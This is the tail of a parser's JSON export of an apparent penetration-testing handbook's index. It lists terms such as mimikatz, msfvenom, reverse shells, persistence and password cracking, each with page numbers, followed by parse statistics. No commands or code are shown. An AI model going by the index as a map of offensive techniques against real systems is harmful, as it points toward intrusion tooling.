      "content": "findmnt, 59",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "findstr, 23, 47",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "forfiles, 24, 45",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "FPipe, 125",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Frequency, 87",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "fstab, 59",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "FTP, 121",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "G",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "gcc, 67",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Google Hacking, 10",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "GPS, 87",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "grep, 62",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "gzip, 63",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "H",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "hciconfig, 89",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "hcitool, 89",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "host, 61",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "hostname, 51",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "hping3, 107",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Hydra, 108",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "I",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "id, 51, 59",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ifconfig, 51, 60, 61, 77, 89",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iframe, 92",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "init, 67",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ipconfig, 20",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables, 74, 75",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IPv4, 81",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IPV6, 83",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iwconfig, 89",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iwlist, 61",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "J",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Java, 124",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "John The Ripper, 108",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "K",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "K Band, 87",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ka Band, 87",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "kill, 59, 68",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "killall, 59",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Kismet, 88",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ku Band, 87",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "L",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "last, 51, 59",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ln, 68",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "logins, 77",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "lsof, 60",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "M",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "makecab, 24, 30",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "md5sum, 63",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mdk3, 90",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Metasploit, 102",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mimikatz, 46",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mkdir, 52",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mklink, 25",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "MMC COMObject, 26",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mount, 51, 59, 67, 68",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "msfvenom, 103",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "MSSQL, 94",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "MySQL, 95",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "N",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nano, 64",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ndiff, 98",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net accounts, 29",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net group, 29",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net localgroup, 19, 29, 34",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net session, 18, 22, 32",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net share, 18, 34",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net use, 22",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net user, 29, 34, 94",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net view, 22, 29, 47",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Netcat, 101, 123",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netsh, 20, 34",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netstat, 20, 51, 60, 77",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nmap, 97",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Nmap, 106",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NMap, 85",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nohup, 67",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nslookup, 20",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NTP, 118",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "O",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "office2john, 109",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Oracle, 95",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "P",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "passwd, 57, 59",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "password cracking, 108",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "PATH, 51, 67",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "People Search, 10",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Perl, 119, 123",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "persistence, 37, 39, 64",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Persistence, 37, 127",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "PHP, 124",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Plist, 51",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "plutil, 51",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ports, 79, 80",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "POSTGRES, 94",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Powershell, 41, 42, 43",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Prefetch, 36",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "proxychains, 106",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ps, 51, 59, 105",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "python, 114",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Python, 113, 115, 116, 123",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "R",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rdesktop, 67",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "RDP, 33",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "REG ADD, 22",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Regex Expressions, 111",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Reverse DNS, 85",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reverse shells, 123",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "RFID, 87",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rfkill, 89",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "route, 20, 60, 77, 84, 102, 106",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rpm, 58",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rsumrf6, 83",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ruby, 124",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run Key, 37",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "runas, 19, 42",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "S",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc, 19, 26, 39",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scada, 80",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scapy, 117",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scheduled Task, 37",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "schtasks.exe, 27, 37, 39",
      "level": 0,
      "metadata": {
        "file_paths": [
          "schtasks.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "scp, 69",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "screen, 73",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sdptool, 89",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SendMail, 115",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "service, 76",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Service creation, 39",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "set, 18",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sha1sum, 63",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "shadow, 57",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "shred, 62",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "smbclient, 67",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SNMP, 85",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "socat, 83",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Socat, 125",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "socks4, 106",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Solaris, 77",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SQLMap, 93",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SSH, 69",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ssh –L, 70",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ssh –R, 7, 70",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ssh-keygen, 69",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Startup Directories, 38",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "STunnel, 125",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Subnet, 82",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Subnetting, 81",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sw_vers, 51",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "systemctl, 64, 76",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "systeminfo, 18, 22",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "T",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tar, 63",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "taskkill, 19",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tasklist, 19, 22, 47",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump, 71, 72",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpkill, 61",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Telnet, 124",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "top, 59",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "touch, 62",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tradecraft, 127",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tree.com, 24",
      "level": 0,
      "metadata": {
        "file_paths": [
          "tree.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Tunnel, 125",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "type, 20, 23, 62, 70, 75, 76, 88, 91, 93, 94, 99, 127",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Type Conversions, 92",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "U",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "umount, 68",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "uname, 51, 58",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "upx, 63",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User Agent String, 91",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "useradd, 59",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "userdel, 59",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "usermod, 59",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "V",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "VSS, 25",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "vssadmin, 25",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "W",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "w, 51, 59",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "w32tm, 31",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "watch, 60",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wc, 62",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wevtutil, 32, 36",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wget, 67",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Wget, 92",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "WGET, 124",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "which, 58",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "who, 59",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "WHOIS, 9",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Wi-Fi, 89",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Wireshark, 99",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "WitnessMe, 93",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wmic, 18, 19, 22, 25, 34, 46",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wpa_supplicant, 89",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "WPA-PSK, 89",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "WptsExtensions, 40",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "X",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "xcopy, 22",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "xsltproc, 98",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "XTerm, 124",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Z",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ZigBee, 87",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "zip, 63",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Zone Transfer, 61",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    }
  ],
  "summary": {
    "total_blocks": 4164,
    "content_distribution": {
      "paragraph": 3487,
      "code_block": 597,
      "list": 4,
      "heading": 74,
      "quote": 2
    },
    "estimated_reading_time": 62,
    "key_topics": [
      "windows",
      "user",
      "file",
      "system",
      "list",
      "port",
      "display",
      "service",
      "with",
      "domain"
    ],
    "complexity_level": "advanced",
    "word_count": 12534,
    "readability_metrics": {
      "avg_sentence_length": 13.7,
      "long_word_percentage": 36.1
    }
  },
  "version": "2.0.0"
}